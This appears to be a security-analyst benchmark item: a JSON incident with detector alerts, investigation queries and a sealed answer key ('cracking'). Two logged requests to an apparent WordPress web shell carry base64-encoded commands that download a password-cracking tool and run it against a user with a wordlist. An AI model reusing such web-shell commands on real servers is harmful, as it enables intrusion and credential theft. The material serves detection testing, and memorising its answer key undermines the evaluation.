@@ -1,0 +1,207 @@
+{
+  "incident_id": "ait-wardbeck-cracking",
+  "name": "AIT-ADS wardbeck/cracking",
+  "source_benchmark": "Cyber-AIT-ADS",
+  "source_scenario": "wardbeck/cracking",
+  "alert": {
+    "timestamp": "2022-01-23T12:13:45Z",
+    "host": "wardbeck",
+    "user": "unknown",
+    "alert_type": "ait_ads_stage",
+    "summary": "AIT-ADS multi-step stage candidate on wardbeck: cracking"
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-01-23T12:13:45Z",
+    "end": "2022-01-23T12:44:19Z",
+    "hosts": [
+      "wardbeck"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-0001-bc7cbb19",
+        "timestamp": "2022-01-23T12:13:45Z",
+        "host": "wardbeck",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.132.56.81 - - [23/Jan/2022:12:13:45 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506737 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642940025.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.132.56.81 - - [23/Jan/2022:12:13:45 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506737 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0002-9e7fa8c4",
+        "timestamp": "2022-01-23T12:14:14Z",
+        "host": "wardbeck",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.132.56.81 - - [23/Jan/2022:12:14:14 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiYmxvcmQiXQ%3D%3D HTTP/1.1\" 200 506897 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642940054.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.132.56.81 - - [23/Jan/2022:12:14:14 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiYmxvcmQiXQ%3D%3D HTTP/1.1\" 200 506897 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0003-bbca6582",
+        "timestamp": "2022-01-23T12:15:04Z",
+        "host": "wardbeck",
+        "detector": "AMiner: CPU value out of expected range in monitoring logs.",
+        "message": "{\"host\":{\"cpu\":{\"pct\":1},\"name\":\"intranet-server\"},\"service\":{\"type\":\"system\"},\"ecs\":{\"version\":\"1.9.0\"},\"tags\":[\"beats_input_raw_event\"],\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"system\":{\"cpu\":{\"softirq\":{\"norm\":{\"pct\":0.0027},\"pct\":0.0027},\"nice\":{\"norm\":{\"pct\":0.9378},\"pct\":0.9378},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"steal\":{\"norm\":{\"pct\":2.0E-4},\"pct\":2.0E-4},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"cores\":1,\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0336},\"pct\":0.0336},\"user\":{\"norm\":{\"pct\":0.0258},\"pct\":0.0258},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0}}},\"agent\":{\"id\":\"83d108ba-251b-4694-b7ca-ae2ddaac1a04\",\"name\":\"intranet-server\",\"type\":\"metricbeat\",\"version\":\"7.13.2\",\"hostname\":\"intranet-server\",\"ephemeral_id\":\"67a782c7-f416-40af-b2e4-df57d6d9ea9f\"},\"event\":{\"module\":\"system\",\"dataset\":\"system.cpu\",\"duration\":639276},\"@timestamp\":\"2022-01-23T12:15:04.182Z\",\"@version\":\"1\"}",
+        "raw_alert": {
+          "timestamp": 1642940104.18,
+          "detector": "AMiner: CPU value out of expected range in monitoring logs.",
+          "message": "{\"host\":{\"cpu\":{\"pct\":1},\"name\":\"intranet-server\"},\"service\":{\"type\":\"system\"},\"ecs\":{\"version\":\"1.9.0\"},\"tags\":[\"beats_input_raw_event\"],\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"system\":{\"cpu\":{\"softirq\":{\"norm\":{\"pct\":0.0027},\"pct\":0.0027},\"nice\":{\"norm\":{\"pct\":0.9378},\"pct\":0.9378},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"steal\":{\"norm\":{\"pct\":2.0E-4},\"pct\":2.0E-4},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"cores\":1,\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0336},\"pct\":0.0336},\"user\":{\"norm\":{\"pct\":0.0258},\"pct\":0.0258},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0}}},\"agent\":{\"id\":\"83d108ba-251b-4694-b7ca-ae2ddaac1a04\",\"name\":\"intranet-server\",\"type\":\"metricbeat\",\"version\":\"7.13.2\",\"hostname\":\"intranet-server\",\"ephemeral_id\":\"67a782c7-f416-40af-b2e4-df57d6d9ea9f\"},\"event\":{\"module\":\"system\",\"dataset\":\"system.cpu\",\"duration\":639276},\"@timestamp\":\"2022-01-23T12:15:04.182Z\",\"@version\":\"1\"}"
+        }
+      },
+      {
+        "event_id": "ait-0004-9789a569",
+        "timestamp": "2022-01-23T12:44:19Z",
+        "host": "wardbeck",
+        "detector": "AMiner: CPU value deviates from average in monitoring logs.",
+        "message": "{\"host\":{\"cpu\":{\"pct\":1},\"name\":\"intranet-server\"},\"service\":{\"type\":\"system\"},\"ecs\":{\"version\":\"1.9.0\"},\"tags\":[\"beats_input_raw_event\"],\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"system\":{\"cpu\":{\"softirq\":{\"norm\":{\"pct\":4.0E-4},\"pct\":4.0E-4},\"nice\":{\"norm\":{\"pct\":0.9356},\"pct\":0.9356},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"steal\":{\"norm\":{\"pct\":9.0E-4},\"pct\":9.0E-4},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0369},\"pct\":0.0369},\"cores\":1,\"user\":{\"norm\":{\"pct\":0.0262},\"pct\":0.0262},\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0}}},\"agent\":{\"id\":\"83d108ba-251b-4694-b7ca-ae2ddaac1a04\",\"name\":\"intranet-server\",\"type\":\"metricbeat\",\"version\":\"7.13.2\",\"hostname\":\"intranet-server\",\"ephemeral_id\":\"67a782c7-f416-40af-b2e4-df57d6d9ea9f\"},\"event\":{\"module\":\"system\",\"dataset\":\"system.cpu\",\"duration\":475484},\"@timestamp\":\"2022-01-23T12:44:19.170Z\",\"@version\":\"1\"}",
+        "raw_alert": {
+          "timestamp": 1642941859.17,
+          "detector": "AMiner: CPU value deviates from average in monitoring logs.",
+          "message": "{\"host\":{\"cpu\":{\"pct\":1},\"name\":\"intranet-server\"},\"service\":{\"type\":\"system\"},\"ecs\":{\"version\":\"1.9.0\"},\"tags\":[\"beats_input_raw_event\"],\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"system\":{\"cpu\":{\"softirq\":{\"norm\":{\"pct\":4.0E-4},\"pct\":4.0E-4},\"nice\":{\"norm\":{\"pct\":0.9356},\"pct\":0.9356},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"steal\":{\"norm\":{\"pct\":9.0E-4},\"pct\":9.0E-4},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0369},\"pct\":0.0369},\"cores\":1,\"user\":{\"norm\":{\"pct\":0.0262},\"pct\":0.0262},\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0}}},\"agent\":{\"id\":\"83d108ba-251b-4694-b7ca-ae2ddaac1a04\",\"name\":\"intranet-server\",\"type\":\"metricbeat\",\"version\":\"7.13.2\",\"hostname\":\"intranet-server\",\"ephemeral_id\":\"67a782c7-f416-40af-b2e4-df57d6d9ea9f\"},\"event\":{\"module\":\"system\",\"dataset\":\"system.cpu\",\"duration\":475484},\"@timestamp\":\"2022-01-23T12:44:19.170Z\",\"@version\":\"1\"}"
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-0001-bc7cbb19",
+      "source": "alerts",
+      "timestamp": "2022-01-23T12:13:45Z",
+      "host": "wardbeck",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.132.56.81 - - [23/Jan/2022:12:13:45 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506737 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642940025.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.132.56.81 - - [23/Jan/2022:12:13:45 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506737 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0002-9e7fa8c4",
+      "source": "alerts",
+      "timestamp": "2022-01-23T12:14:14Z",
+      "host": "wardbeck",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.132.56.81 - - [23/Jan/2022:12:14:14 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiYmxvcmQiXQ%3D%3D HTTP/1.1\" 200 506897 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642940054.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.132.56.81 - - [23/Jan/2022:12:14:14 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiYmxvcmQiXQ%3D%3D HTTP/1.1\" 200 506897 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0003-bbca6582",
+      "source": "alerts",
+      "timestamp": "2022-01-23T12:15:04Z",
+      "host": "wardbeck",
+      "fields": {
+        "detector": "AMiner: CPU value out of expected range in monitoring logs.",
+        "message": "{\"host\":{\"cpu\":{\"pct\":1},\"name\":\"intranet-server\"},\"service\":{\"type\":\"system\"},\"ecs\":{\"version\":\"1.9.0\"},\"tags\":[\"beats_input_raw_event\"],\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"system\":{\"cpu\":{\"softirq\":{\"norm\":{\"pct\":0.0027},\"pct\":0.0027},\"nice\":{\"norm\":{\"pct\":0.9378},\"pct\":0.9378},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"steal\":{\"norm\":{\"pct\":2.0E-4},\"pct\":2.0E-4},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"cores\":1,\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0336},\"pct\":0.0336},\"user\":{\"norm\":{\"pct\":0.0258},\"pct\":0.0258},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0}}},\"agent\":{\"id\":\"83d108ba-251b-4694-b7ca-ae2ddaac1a04\",\"name\":\"intranet-server\",\"type\":\"metricbeat\",\"version\":\"7.13.2\",\"hostname\":\"intranet-server\",\"ephemeral_id\":\"67a782c7-f416-40af-b2e4-df57d6d9ea9f\"},\"event\":{\"module\":\"system\",\"dataset\":\"system.cpu\",\"duration\":639276},\"@timestamp\":\"2022-01-23T12:15:04.182Z\",\"@version\":\"1\"}",
+        "raw_alert": {
+          "timestamp": 1642940104.18,
+          "detector": "AMiner: CPU value out of expected range in monitoring logs.",
+          "message": "{\"host\":{\"cpu\":{\"pct\":1},\"name\":\"intranet-server\"},\"service\":{\"type\":\"system\"},\"ecs\":{\"version\":\"1.9.0\"},\"tags\":[\"beats_input_raw_event\"],\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"system\":{\"cpu\":{\"softirq\":{\"norm\":{\"pct\":0.0027},\"pct\":0.0027},\"nice\":{\"norm\":{\"pct\":0.9378},\"pct\":0.9378},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"steal\":{\"norm\":{\"pct\":2.0E-4},\"pct\":2.0E-4},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"cores\":1,\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0336},\"pct\":0.0336},\"user\":{\"norm\":{\"pct\":0.0258},\"pct\":0.0258},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0}}},\"agent\":{\"id\":\"83d108ba-251b-4694-b7ca-ae2ddaac1a04\",\"name\":\"intranet-server\",\"type\":\"metricbeat\",\"version\":\"7.13.2\",\"hostname\":\"intranet-server\",\"ephemeral_id\":\"67a782c7-f416-40af-b2e4-df57d6d9ea9f\"},\"event\":{\"module\":\"system\",\"dataset\":\"system.cpu\",\"duration\":639276},\"@timestamp\":\"2022-01-23T12:15:04.182Z\",\"@version\":\"1\"}"
+        }
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "wardbeck"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "wardbeck"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "AIT-ADS multi-step stage candidate on wardbeck: cracking",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "wardbeck"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "wardbeck"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "AIT-ADS multi-step stage candidate on wardbeck: cracking",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-AIT-ADS",
+    "scenario": "wardbeck/cracking",
+    "answer": "cracking",
+    "accept": [
+      "cracking",
+      "cracking"
+    ],
+    "grading": "exact_ci",
+    "sealed": true
+  }
+}
